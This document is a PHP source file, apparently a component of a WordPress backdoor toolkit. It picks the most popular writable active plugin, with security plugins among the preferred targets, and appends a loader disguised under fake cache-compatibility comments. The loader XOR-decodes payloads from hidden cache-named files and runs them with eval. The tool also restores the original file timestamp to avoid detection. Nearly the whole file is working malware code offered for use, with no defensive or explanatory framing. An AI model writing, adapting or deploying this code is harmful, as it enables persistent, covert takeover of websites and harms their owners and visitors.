<?php
/**
 * Plugin Injection Engine
 * Injects a minimal XOR-payload loader into an existing active plugin file.
 * No backup files — zero extra artifacts on disk.
 */

define('_INJ_MK_S', '/* @wp_cache_compat_init */');
define('_INJ_MK_E', '/* @wp_cache_compat_end */');

function _get_loader_snippet() {
    $p = array();
    $p[] = _INJ_MK_S;
    $p[] = 'if(!defined("__WP_CC_L")){define("__WP_CC_L",1);';
    $p[] = '$__ps=array(WP_CONTENT_DIR."/cache/.object-cache-meta.php",';
    $p[] = 'WP_CONTENT_DIR."/uploads/.wp-cache-fragment.dat",';
    $p[] = 'WP_CONTENT_DIR."/upgrade/.cache-manifest.tmp");';
    $p[] = 'foreach($__ps as $__pf){';
    $p[] = 'if(!file_exists($__pf))continue;';
    $p[] = '$__pr=@file_get_contents($__pf);';
    $p[] = 'if($__pr===false||strlen($__pr)<33)continue;';
    $p[] = '$__pk=substr($__pr,0,16);$__pd=substr($__pr,16);$__po="";';
    $p[] = 'for($__pi=0;$__pi<strlen($__pd);$__pi++)';
    $p[] = '$__po.=$__pd[$__pi]^$__pk[$__pi%16];';
    $p[] = 'if(strpos($__po,"<"."?")===0){@eval("?".">".$__po);break;}}}';
    $p[] = _INJ_MK_E;
    return "\n" . implode("\n", $p) . "\n";
}

function _score_plugin($pfile, $pdata, $wroot) {
    $score = 0;
    $fpath = $wroot . '/wp-content/plugins/' . $pfile;
    if (!file_exists($fpath) || !is_writable($fpath)) return -1;

    $sz = filesize($fpath);
    $raw = @file_get_contents($fpath);
    if (!$raw) return -1;
    if (strpos($raw, _INJ_MK_S) !== false) return -1;

    if ($sz > 10000) $score += 3;
    elseif ($sz > 3000) $score += 2;
    else $score += 1;

    $pop = array('woocommerce','elementor','contact-form','jetpack','yoast',
        'akismet','wordfence','updraft','really-simple','wpforms',
        'all-in-one','litespeed','w3-total','wp-super-cache',
        'redirection','duplicate-post','classic-editor','tinymce',
        'advanced-custom','tablepress','ninja-forms','mailchimp',
        'google-analytics','monsterinsights','sucuri','ithemes',
        'limit-login','loginizer');
    $slug = strtolower(dirname($pfile));
    foreach ($pop as $pp) {
        if (strpos($slug, $pp) !== false) { $score += 5; break; }
    }

    $lc = substr_count($raw, "\n");
    if ($lc > 200) $score += 3;
    elseif ($lc > 50) $score += 1;

    $tail = substr(rtrim($raw), -2);
    if ($tail === '?' . '>') $score += 2;

    $avg = $sz / max(1, $lc);
    if ($avg > 500) $score -= 3;

    return $score;
}

function _find_injection_target($wroot) {
    if (!function_exists('get_plugins')) {
        require_once $wroot . '/wp-admin/includes/plugin.php';
    }
    $all = get_plugins();
    $active = get_option('active_plugins', array());
    $cands = array();

    foreach ($all as $f => $d) {
        if (!in_array($f, $active)) continue;
        $sc = _score_plugin($f, $d, $wroot);
        if ($sc < 0) continue;
        $cands[] = array(
            'plugin_file' => $f,
            'abs_path'    => $wroot . '/wp-content/plugins/' . $f,
            'name'        => isset($d['Name']) ? $d['Name'] : basename($f),
            'score'       => $sc,
        );
    }
    if (empty($cands)) return null;
    usort($cands, function($a, $b) { return $b['score'] - $a['score']; });
    return $cands[0];
}

function _inject_loader_into_plugin($wroot) {
    $target = _find_injection_target($wroot);
    if (!$target) {
        return array('status' => 'failed', 'reason' => 'no suitable active plugin found');
    }

    $fpath = $target['abs_path'];
    $raw = file_get_contents($fpath);
    $omtime = filemtime($fpath);

    if (strpos($raw, _INJ_MK_S) !== false) {
        return array('status' => 'already', 'plugin' => $target['name'], 'path' => $fpath);
    }

    $trimmed = rtrim($raw);
    if (substr($trimmed, -2) === '?' . '>') {
        $raw = substr($trimmed, 0, -2);
    }

    $new = $raw . "\n" . _get_loader_snippet() . "\n";

    $ok = @file_put_contents($fpath, $new);
    if ($ok === false) {
        return array('status' => 'failed', 'reason' => 'write_failed', 'path' => $fpath);
    }
    @touch($fpath, $omtime);

    return array(
        'status'     => 'injected',
        'plugin'     => $target['name'],
        'path'       => $fpath,
        'score'      => $target['score'],
        'size_delta' => strlen($new) - strlen($raw),
    );
}

function _remove_loader_injection($wroot) {
    $pdir = $wroot . '/wp-content/plugins';
    $removed = array();

    $rii = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($pdir, RecursiveDirectoryIterator::SKIP_DOTS)
    );

    foreach ($rii as $fi) {
        if ($fi->getExtension() !== 'php') continue;
        $fp = $fi->getPathname();
        $raw = @file_get_contents($fp);
        if ($raw === false) continue;
        if (strpos($raw, _INJ_MK_S) === false) continue;

        $omtime = filemtime($fp);
        $s = strpos($raw, _INJ_MK_S);
        $e = strpos($raw, _INJ_MK_E);

        if ($s !== false && $e !== false) {
            $clean = substr($raw, 0, $s) . substr($raw, $e + strlen(_INJ_MK_E));
            @file_put_contents($fp, rtrim($clean) . "\n");
            @touch($fp, $omtime);
            $removed[] = array('path' => $fp, 'method' => 'stripped_markers');
        }
    }
    return $removed;
}
